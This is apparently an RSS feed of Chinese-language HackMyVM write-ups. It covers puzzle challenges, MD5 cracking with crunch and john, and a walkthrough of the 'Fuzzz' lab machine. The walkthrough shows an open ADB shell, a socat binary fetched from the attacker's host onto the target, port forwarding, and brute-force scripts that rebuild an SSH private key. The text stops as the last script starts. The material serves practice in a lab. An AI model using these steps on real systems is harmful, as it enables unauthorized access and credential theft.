鵷𓁥鑥陨驶𖥟𓍯靟驥鑮𒅲汪潟ᔩ Ex: HMV{Flag}
```

字符依然是超宽 Unicode，很像上道题。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20057.html</guid><pubDate>Sat, 05 Jul 2025 14:35:12 +0000</pubDate></item><item><title>Challenge 056</title><link>https://7r1UMPHK.github.io/post/Challenge%20056.html</link><description>![image-20250705220557455](https://7r1umphk.github.io/image/20250705220557660.webp)

```
&lt;pre&gt; նҿԈೡ౾ଳߦϻݧWطಧÆѕఊ۷ܔѤɦධʪкೞƝݩবđӌࠒબຢԩݙυࢲڵࡔत Hint: Base what? &lt;/pre&gt;
```

提示base
全是 Unicode 字符
明显不是 base64、base32、base58 等常见编码
包含南亚,阿拉伯,泰文等字符：可能属于**“超大基数编码”**（例如 base1024、base2048）。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20056.html</guid><pubDate>Sat, 05 Jul 2025 14:33:20 +0000</pubDate></item><item><title>Challenge 055</title><link>https://7r1UMPHK.github.io/post/Challenge%20055.html</link><description>![image-20250705214803760](https://7r1umphk.github.io/image/20250705214803963.webp)

```
&lt;pre&gt; MCZJ/CJ[[J]\.7¿?;(?9!?-\/&lt;;¿:=(=6!?-X K: wtf &lt;/pre&gt;
```

有点谜语人，是XOR
我的强行理解就是
看起来乱，但都是ASCII可打印字符
有key
有?
没有明显 base64/hex 特征

![image-20250705220022860](https://7r1umphk.github.io/image/20250705220022997.webp)

![image-20250705220038576](https://7r1umphk.github.io/image/20250705220039230.webp)

HMV{CAP}。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20055.html</guid><pubDate>Sat, 05 Jul 2025 14:30:52 +0000</pubDate></item><item><title>Challenge 054</title><link>https://7r1UMPHK.github.io/post/Challenge%20054.html</link><description>![image-20250705190326651](https://7r1umphk.github.io/image/20250705190326857.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl -v http://momo.hackmyvm.eu/f0rw4rd  
* Host momo.hackmyvm.eu:80 was resolved.
* IPv6: (none)
* IPv4: 5.45.101.64
*   Trying 5.45.101.64:80...
* Connected to momo.hackmyvm.eu (5.45.101.64) port 80
* using HTTP/1.x
&gt; GET /f0rw4rd HTTP/1.1
&gt; Host: momo.hackmyvm.eu
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 301 Moved Permanently
&lt; Server: nginx/1.18.0
&lt; Date: Sat, 05 Jul 2025 11:03:36 GMT
&lt; Content-Type: text/html
&lt; Content-Length: 169
&lt; Location: http://momo.hackmyvm.eu/f0rw4rd/
&lt; Connection: keep-alive
&lt; 
&lt;html&gt;
&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx/1.18.0&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;
* Connection #0 to host momo.hackmyvm.eu left intact
                                                                     
```

这挑战也是见鬼

也是不行

https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/HackMyVM/Challenges/Web/054

巨魔佬可以复现，我复现不了，不管了，搁着

```
HMV{Pay-it-FORWARD-x!}
```

。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20054.html</guid><pubDate>Sat, 05 Jul 2025 14:25:59 +0000</pubDate></item><item><title>Challenge 053</title><link>https://7r1UMPHK.github.io/post/Challenge%20053.html</link><description>![image-20250705184956768](https://7r1umphk.github.io/image/20250705185005753.webp)

https://hackmyvm.eu/challenges/challenge.php?c=053

```
&lt;pre&gt; 9950b5c66f8518f8b012359dc7390589 c03ec75734f58d87cddff35c57786429 e757e84e31ef68a74d86d6b52478654c HMV{c761d942cf5fe4ba9ece382739afef4e} &lt;/pre&gt;
```

看着像hash

![image-20250705185544591](https://7r1umphk.github.io/image/20250705185544745.webp)

像找规律，生成字典

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ crunch 7 7 -t 1@@@@@4 -o pass                  
Crunch will now generate the following amount of data: 95051008 bytes
90 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 11881376 

crunch: 100% completed generating output
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ tail -n 1 pass
1zzzzz4
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ head -n 1 pass               
1aaaaa4
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ john --wordlist=pass --format=raw-md5 hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 512/512 AVX512BW 16x3])
Warning: no OpenMP support for this hash type, consider --fork=8
Press 'q' or Ctrl-C to abort, almost any other key for status
1lordp4          (?)     
1g 0:00:00:00 DONE (2025-07-05 07:02) 9.090g/s 48041Kp/s 48041Kc/s 48041KC/s 1loqiq4..1lormd4
Use the '--show --format=Raw-MD5' options to display all of the cracked passwords reliably
Session completed. 
                      
```

HMV{1lordp4}。</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20053.html</guid><pubDate>Sat, 05 Jul 2025 14:25:39 +0000</pubDate></item><item><title>hmv_Fuzzz</title><link>https://7r1UMPHK.github.io/post/hmv_Fuzzz.html</link><description>```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                   
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.163 08:00:27:38:b0:90       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:e4:9a:30       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.285 seconds (112.04 hosts/sec). 4 responded
                                                                                                   
```

192.168.205.163

服务探测

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:10 EDT
Nmap scan report for 192.168.205.163
Host is up (0.00041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
5555/tcp open  freeciv
MAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.55 seconds                       

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p5555 -sV 192.168.205.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:10 EDT
Nmap scan report for 192.168.205.163
Host is up (0.00035s latency).

PORT     STATE SERVICE VERSION
5555/tcp open  adb     Android Debug Bridge (token auth required)
MAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Android; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.40 seconds
```

adb，连接上去

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ adb connect 192.168.205.163:5555
connected to 192.168.205.163:5555
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ adb devices                     
List of devices attached
192.168.205.163:5555    device

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ adb shell  
/ $ id
uid=1000(runner) gid=1000(runner) groups=1000(runner)
/ $ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

For security reasons, the password you type will not be visible.

[sudo] password for runner: 
sudo: a password is required
/ $ cd 
~ $ ls -al
total 8
drwx------    2 runner   runner        4096 May 19 09:08 .
drwxr-xr-x    4 root     root          4096 May 19 10:02 ..
lrwxrwxrwx    1 root     runner           9 May 19 09:08 .ash_history -&gt; /dev/null
~ $ ss -tnlp
/bin/sh: ss: not found
~ $ netstat -lntup
netstat: showing only processes with your user ID
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:80            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5555            0.0.0.0:*               LISTEN      2513/python3
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 :::22                   :::*                    LISTEN      -
```

传一个socat转发端口(这里的socat需要静态编译的，它这个靶机貌似是alpine的，所以你直接拉kali的socat是不行的，自己去网上下一个，有编译好的)

```
~ $ wget 192.168.205.128/socat
Connecting to 192.168.205.128 (192.168.205.128:80)
saving to 'socat'
socat                100% |********************************| 4724k  0:00:00 ETA
'socat' saved
~ $ chmod +x socat
~ $ ./socat TCP-LISTEN:8000,fork TCP4:127.0.0.1:80 &amp;
```

看看服务转发出来没有（这个shell会自动断开，所以如果断开重新连就好了，反正就传一个socat上去）

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p8000 192.168.205.163
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-01 20:13 EDT
Nmap scan report for 192.168.205.163
Host is up (0.00032s latency).

PORT     STATE SERVICE
8000/tcp open  http-alt
MAC Address: 08:00:27:38:B0:90 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
```

访问

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.163:8000          
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.163:8000 -v
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET / HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
```

目录爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ dirsearch -u http://192.168.205.163:8000 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /mnt/hgfs/gx/x/reports/http_192.168.205.163_8000/_25-07-01_20-18-36.txt

Target: http://192.168.205.163:8000/

[20:18:36] Starting: 

Task Completed
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,zip,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/line                 (Status: 200) [Size: 0]
/line2                (Status: 200) [Size: 0]
/line1                (Status: 200) [Size: 0]
Progress: 35450 / 1102800 (3.21%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 36260 / 1102800 (3.29%)
===============================================================
Finished
===============================================================
```

这里我停了，因为它爆破出来的/line有点像分开藏东西

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.163:8000/line -v
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl 192.168.205.163:8000/line/ -v
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line/ HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 404 NOT FOUND
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 207
&lt; 
&lt;!doctype html&gt;
&lt;html lang=en&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                     
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/b                    (Status: 200) [Size: 0]
/b3                   (Status: 200) [Size: 0]
Progress: 465323 / 1102800 (42.19%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 466276 / 1102800 (42.28%)
===============================================================
Finished
===============================================================                   
```

看看其他的

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line1
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line1 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line2
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line2 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line1/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line1/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/b                    (Status: 200) [Size: 0]
/b3                   (Status: 200) [Size: 0]
Progress: 23647 / 1102800 (2.14%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 24595 / 1102800 (2.23%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line2/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line2/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,zip,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Q                    (Status: 200) [Size: 0]
Progress: 51864 / 1102800 (4.70%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 53006 / 1102800 (4.81%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line3                                                                                                                         
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line3 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line4
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line4 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line5
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line5 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 0
&lt; 
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl -v http://192.168.205.163:8000/line6
*   Trying 192.168.205.163:8000...
* Connected to 192.168.205.163 (192.168.205.163) port 8000
* using HTTP/1.x
&gt; GET /line6 HTTP/1.1
&gt; Host: 192.168.205.163:8000
&gt; User-Agent: curl/8.14.1
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 404 NOT FOUND
&lt; Content-Type: text/html; charset=utf-8
&lt; Content-Length: 207
&lt; 
&lt;!doctype html&gt;
&lt;html lang=en&gt;
&lt;title&gt;404 Not Found&lt;/title&gt;
&lt;h1&gt;Not Found&lt;/h1&gt;
&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
* Connection #0 to host 192.168.205.163 left intact
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line3/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line3/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/X                    (Status: 200) [Size: 0]
Progress: 39151 / 1102800 (3.55%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 39753 / 1102800 (3.60%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line4/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line4/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/A                    (Status: 200) [Size: 0]
Progress: 28543 / 1102800 (2.59%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 28874 / 1102800 (2.62%)
===============================================================
Finished
===============================================================
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://192.168.205.163:8000/line5/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.163:8000/line5/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              zip,php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/5                    (Status: 200) [Size: 0]
Progress: 23689 / 1102800 (2.15%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 24483 / 1102800 (2.22%)
===============================================================
Finished
===============================================================
```

看起来像爆破字符，先爆破一行看看

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ chars=({a..z} {A..Z} {0..9}); dir=''; while true; do found=false; for c in '${chars[@]}'; do testdir='$dir$c'; res=$(curl -s -o /dev/null -w '%{http_code}' 'http://192.168.205.163:8000/line1/$testdir'); [[ '$res' == '200' ]] &amp;&amp; { echo 'Found: $testdir'; dir='$testdir'; found=true; break; }; done; $found || break; done
Found: b
Found: b3
Found: b3B
Found: b3Bl
Found: b3Blb
Found: b3Blbn
Found: b3BlbnN
Found: b3BlbnNz
Found: b3BlbnNza
Found: b3BlbnNzaC
Found: b3BlbnNzaC1
Found: b3BlbnNzaC1r
Found: b3BlbnNzaC1rZ
Found: b3BlbnNzaC1rZX
Found: b3BlbnNzaC1rZXk
Found: b3BlbnNzaC1rZXkt
Found: b3BlbnNzaC1rZXktd
Found: b3BlbnNzaC1rZXktdj
Found: b3BlbnNzaC1rZXktdjE
Found: b3BlbnNzaC1rZXktdjEA
Found: b3BlbnNzaC1rZXktdjEAA
Found: b3BlbnNzaC1rZXktdjEAAA
Found: b3BlbnNzaC1rZXktdjEAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAAB
Found: b3BlbnNzaC1rZXktdjEAAAAABG
Found: b3BlbnNzaC1rZXktdjEAAAAABG5
Found: b3BlbnNzaC1rZXktdjEAAAAABG5v
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vb
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbm
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmU
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAE
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEb
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9u
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZ
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQ
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAAB
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAM
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMw
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAA
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAt
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtz
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2g
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gt
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZ
Found: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW

┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ echo 'b3BlbnNzaC1rZXktdjE' | base64 -d 
openssh-key-v1                                                                  
```

是OpenSSH私钥
重新写一个脚本

```
#!/bin/bash

chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+='
dir=''

for line in {1..5}; do
  url='http://192.168.205.163:8000/line$line/'
  dir=''
  while true; do
    found=0
    for ((i=0; i&lt;${#chars}; i++)); do
      c='${chars:$i:1}'
      testdir='$dir$c'
      code=$(curl -s -o /dev/null -w '%{http_code}' '$url$testdir')
      if [ '$code' = '200' ]; then
        dir='$testdir'
        echo -n '$c'
        found=1
        break
      fi
    done
    [ $found -eq 0 ] &amp;&amp; break
  done
  echo
done
```

运行

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ bash bp.sh
